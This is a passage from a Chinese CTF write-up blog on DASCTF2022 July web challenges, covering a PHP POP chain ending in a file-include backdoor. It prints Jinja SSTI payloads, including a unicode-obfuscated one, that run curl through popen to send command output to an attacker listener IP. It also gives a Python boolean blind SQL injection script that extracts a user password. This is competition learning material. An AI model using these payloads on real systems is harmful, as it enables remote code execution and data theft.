+<p>这里的<code>$name</code>就是刚调用的不可达的方法也就是<code>ok()</code>,跟<code>__get($name)</code>里的$name不一样。</p>
+<p>这里的<code>$arguments</code>就是ok()自带的参数也就是<code>ok($name)</code>里面的<code>$name</code>,即我们可控的<code>$size</code></p>
+<p>我认为这里还挺绕，刚开始没理解 ，这样解释一下就好很多</p>
+<p>回到起点，我们可以控制的$size应该附什么值？</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">backdoor</span>(<span style="color:#a6e22e">end</span>($arguments));
+</span></span></code></pre></div><p>我们pop链子最终的目的就是调用<code>backdoor()</code>,<code>$arguements</code>应该是我们要包含的文件，所以$size就是我们要包含的文件</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">backdoor</span>($door){
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">include</span>($door);
+</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;hacked!!&#34;</span>;
+</span></span><span style="display:flex;"><span>        }
+</span></span></code></pre></div><h2 id="harddiskssti盲注以及bypass">Harddisk（SSTI盲注以及bypass）</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111712807.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111712807.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111712807.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111712807.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111712807.png"
+        title="image-20221111171234674" /></p>
+<p>比较明显的考点，就是SSTI，过滤了{{}}</p>
+<p>这时候就要想到用<code>{%print(123)%}</code>的方式看有没有回显,然而print也被过滤了</p>
+<p>还有个方式<code>{%if(1==1)%}123{%endif%}</code></p>
+<p>.<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111715666.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111715666.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111715666.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111715666.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111715666.png"
+        title="image-20221111171537634" /></p>
+<p>这只能判断if条件里的语句是否正确，不能够回显执行的结果，所以我们要用外带数据的方法来得到payload执行的结果。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span><span style="color:#66d9ef">__class__</span><span style="color:#f92672">.</span><span style="color:#a6e22e">__bases__</span>[<span style="color:#ae81ff">0</span>]<span style="color:#f92672">.</span><span style="color:#a6e22e">__subclasses__</span>()[<span style="color:#ae81ff">133</span>]<span style="color:#f92672">.</span><span style="color:#a6e22e">__init__</span><span style="color:#f92672">.</span><span style="color:#a6e22e">__globals__</span>[<span style="color:#e6db74">&#34;popen&#34;</span>](<span style="color:#e6db74">&#34;curl ip:4444 -d &#34;</span><span style="color:#e6db74">`ls /`</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">.</span><span style="color:#a6e22e">read</span>())<span style="color:#f92672">%</span>}<span style="color:#ae81ff">123</span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">endif</span><span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>首先测试一下哪些基本的符号被ban,发现 [ ] _ . 这些都被ban了，还有好多关键字 ，如何绕过</p>
+<p><a href="https://blog.huamang.xyz/ssti" target="_blank" rel="noopener noreffer">https://blog.huamang.xyz/ssti</a>
+</p>
+<p>.和[ ] 配合<code>|attr</code>和<code>(&quot;__getitem__&quot;)</code>来进行绕过，关键字以及_ 可以用unicode编码绕过</p>
+<p>bypass如下构造  ,()和&quot; &ldquo;还在</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__class__&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__bases__&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__getitem__&#34;</span>)(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__subclasses__&#34;</span>)()<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__getitem__&#34;</span>)(<span style="color:#ae81ff">133</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__init__&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__globals__&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;__getitem__&#34;</span>)(<span style="color:#e6db74">&#34;popen&#34;</span>)(<span style="color:#e6db74">&#34;curl 你的ip:4444 -d &#34;</span><span style="color:#e6db74">`ls /`</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;read&#34;</span>)())<span style="color:#f92672">%</span>}<span style="color:#ae81ff">123</span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">endif</span><span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>&quot; &ldquo;内的字符替换成unicode编码 如下</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">if</span>(<span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0062\u0061\u0073\u0065\u0073\u005f\u005f&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#34;</span>)(<span style="color:#ae81ff">0</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0073\u0075\u0062\u0063\u006c\u0061\u0073\u0073\u0065\u0073\u005f\u005f&#34;</span>)()<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#34;</span>)(<span style="color:#ae81ff">133</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u005f\u005f\u0067\u0065\u0074\u0069\u0074\u0065\u006d\u005f\u005f&#34;</span>)(<span style="color:#e6db74">&#34;\u0070\u006f\u0070\u0065\u006e&#34;</span>)(<span style="color:#e6db74">&#34;\u0063\u0075\u0072\u006c\u0020\u0034\u0037\u002e\u0031\u0030\u0030\u002e\u0031\u0039\u0036\u002e\u0033\u003a\u0034\u0034\u0034\u0034\u0020\u002d\u0064\u0020&#34;</span><span style="color:#e6db74">`\u006c\u0073\u0020\u002f`</span><span style="color:#e6db74">&#34;&#34;</span>)<span style="color:#f92672">|</span><span style="color:#a6e22e">attr</span>(<span style="color:#e6db74">&#34;\u0072\u0065\u0061\u0064&#34;</span>)())<span style="color:#f92672">%</span>}<span style="color:#ae81ff">1</span>{<span style="color:#f92672">%</span><span style="color:#66d9ef">endif</span><span style="color:#f92672">%</span>}
+</span></span></code></pre></div><p>nc开启监听后，执行payload ，但是这里没有复现成功 ，看别的师傅也有类似的问题</p>
+<h2 id="绝对防御-js接口sql盲注">绝对防御 （JS接口+sql盲注）</h2>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111924244.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111924244.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111924244.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111924244.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211111924244.png"
+        title="image-20221111192408061" /></p>
+<p>进来是一张大图片 ，似乎整个网站就是一张图片所以取名无懈可击</p>
+<p>直接F12翻源码，是有很多js文件，可以在里面去找一找web接口</p>
+<p>了解到这个网站是php搭建的，直接搜.php 看有没有</p>
+<!-- raw HTML omitted -->
+<p>真能搜到</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112018738.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112018738.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112018738.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112018738.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112018738.png"
+        title="image-20221111201815698" /></p>
+<p><strong>JSFinder</strong>是一款用作快速在网站的js文件中提取URL，子域名的工具。</p>
+<p>下载地址：https://github.com/Threezh1/JSFinder</p>
+<pre tabindex="0"><code>python3 JSFinder.py -u url
+</code></pre><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112014983.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112014983.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112014983.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112014983.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112014983.png"
+        title="image-20221111201434935" /></p>
+<p>用工具也挺方便 ，直接找到API接口，访问SUPPERAPI.php，查看源代码</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-js" data-lang="js"><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">getQueryVariable</span>(<span style="color:#a6e22e">variable</span>)
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">query</span> <span style="color:#f92672">=</span> window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">search</span>.<span style="color:#a6e22e">substring</span>(<span style="color:#ae81ff">1</span>);
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">vars</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">query</span>.<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;&amp;&#34;</span>);
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">for</span> (<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">i</span><span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">vars</span>.<span style="color:#a6e22e">length</span>;<span style="color:#a6e22e">i</span><span style="color:#f92672">++</span>) {
+</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">var</span> <span style="color:#a6e22e">pair</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">vars</span>[<span style="color:#a6e22e">i</span>].<span style="color:#a6e22e">split</span>(<span style="color:#e6db74">&#34;=&#34;</span>);
+</span></span><span style="display:flex;"><span>               <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">pair</span>[<span style="color:#ae81ff">0</span>] <span style="color:#f92672">==</span> <span style="color:#a6e22e">variable</span>){<span style="color:#66d9ef">return</span> <span style="color:#a6e22e">pair</span>[<span style="color:#ae81ff">1</span>];}
+</span></span><span style="display:flex;"><span>       }
+</span></span><span style="display:flex;"><span>       <span style="color:#66d9ef">return</span>(<span style="color:#66d9ef">false</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">check</span>(){
+</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">var</span> <span style="color:#a6e22e">reg</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">/[`~!@#$%^&amp;*()_+&lt;&gt;?:&#34;{},.\/;&#39;[\]]/im</span>;
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (<span style="color:#a6e22e">reg</span>.<span style="color:#a6e22e">test</span>(<span style="color:#a6e22e">getQueryVariable</span>(<span style="color:#e6db74">&#34;id&#34;</span>))) {
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">alert</span>(<span style="color:#e6db74">&#34;提示：您输入的信息含有非法字符！&#34;</span>);
+</span></span><span style="display:flex;"><span>            window.<span style="color:#a6e22e">location</span>.<span style="color:#a6e22e">href</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;/&#34;</span>
+</span></span><span style="display:flex;"><span>         }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">check</span>()
+</span></span></code></pre></div><p><code>window.location.search.substring(1)</code>功能为获取当前页面GET方式请求 ? 后的指定参数</p>
+<p>这段代码也容易理解，就是get一个id，返回其值，有个前端的黑名单，直接bp抓包就绕了，Python脚本一样绕。</p>
+<p>都get一个id了，很容易想到sql注入，fuzz一下后端的过滤试试</p>
+<p>发现过滤了<code> if union sleep</code>  那就直接布尔盲注</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112043652.png"
+        data-srcset="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112043652.png, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112043652.png 1.5x, https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112043652.png 2x"
+        data-sizes="auto"
+        alt="https://thnpkm.oss-cn-shanghai.aliyuncs.com/img/202211112043652.png"
+        title="image-20221111204356609" /></p>
+<p>写个脚本 ，最基础的sql盲注</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">import</span> requests
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#sql = &#39;select database()&#39;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#sql=&#34;select group_concat(table_name) from information_schema.tables where table_schema=database()&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#sql=&#34;select group_concat(column_name) from information_schema.columns where table_name=&#39;users&#39;&#34;</span>
+</span></span><span style="display:flex;"><span>sql<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;select password from ctf.users where id=2&#34;</span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">1</span>, <span style="color:#ae81ff">1000</span>):
+</span></span><span style="display:flex;"><span>    low <span style="color:#f92672">=</span> <span style="color:#ae81ff">32</span>
+</span></span><span style="display:flex;"><span>    high <span style="color:#f92672">=</span> <span style="color:#ae81ff">128</span>
+</span></span><span style="display:flex;"><span>    mid <span style="color:#f92672">=</span> (low <span style="color:#f92672">+</span> high) <span style="color:#f92672">//</span> <span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> low <span style="color:#f92672">&lt;</span> high:
+</span></span><span style="display:flex;"><span>        payload <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;1 and (ascii(substr((</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">),</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1))&lt;</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">)#&#34;</span><span style="color:#f92672">.</span>format(sql,i,mid)
+</span></span><span style="display:flex;"><span>        res <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(url<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;http://f0a84e5d-dcd5-4a51-95c3-3c4e5528679b.node4.buuoj.cn:81//SUPPERAPI.php?id=&#34;</span><span style="color:#f92672">+</span>payload)
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> <span style="color:#e6db74">&#39;admin&#39;</span> <span style="color:#f92672">in</span> res<span style="color:#f92672">.</span>text:
+</span></span><span style="display:flex;"><span>            high<span style="color:#f92672">=</span>mid
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>            low <span style="color:#f92672">=</span> mid<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>        mid<span style="color:#f92672">=</span>(low<span style="color:#f92672">+</span>high)<span style="color:#f92672">//</span><span style="color:#ae81ff">2</span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> mid <span style="color:#f92672">&lt;=</span> <span style="color:#ae81ff">32</span> <span style="color:#f92672">or</span> mid <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">127</span>:
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
+</span></span><span style="display:flex;"><span>    time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">0.5</span>)
+</span></span><span style="display:flex;"><span>    result <span style="color:#f92672">+=</span> chr(mid <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)
+</span></span><span style="display:flex;"><span>    print(<span style="color:#e6db74">&#34;[+]&#34;</span> <span style="color:#f92672">+</span> result)
+</span></span></code></pre></div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2024-08-20</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022七月赛" data-hashtags=""><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/" data-hashtag=""><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022七月赛"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022七月赛"><i data-svg-src="https://cdn.jsdelivr.net/npm/simple-icons@6.20.0/icons/line.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="https://thnpkm.github.io/posts/ctf/dasctf2022%E4%B8%83%E6%9C%88%E8%B5%9B/" data-title="DASCTF2022七月赛"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/">Tags</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/posts/ctf/dasctf2022%E4%B9%9D%E6%9C%88%E8%B5%9B/" class="prev" rel="prev" title="DASCTF2022九月赛"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>DASCTF2022九月赛</a>
+            <a href="/posts/ctf/dasctf-7%E6%9C%88/" class="next" rel="next" title="DASCTF 7月">DASCTF 7月<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.133.0">Hugo</a> | Theme - <a href="https://github.com/Fastbyte01/KeepIt" target="_blank" rel="noopener noreffer" title="KeepIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> KeepIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2024</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank"></a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.9/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.1/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"search":{"highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
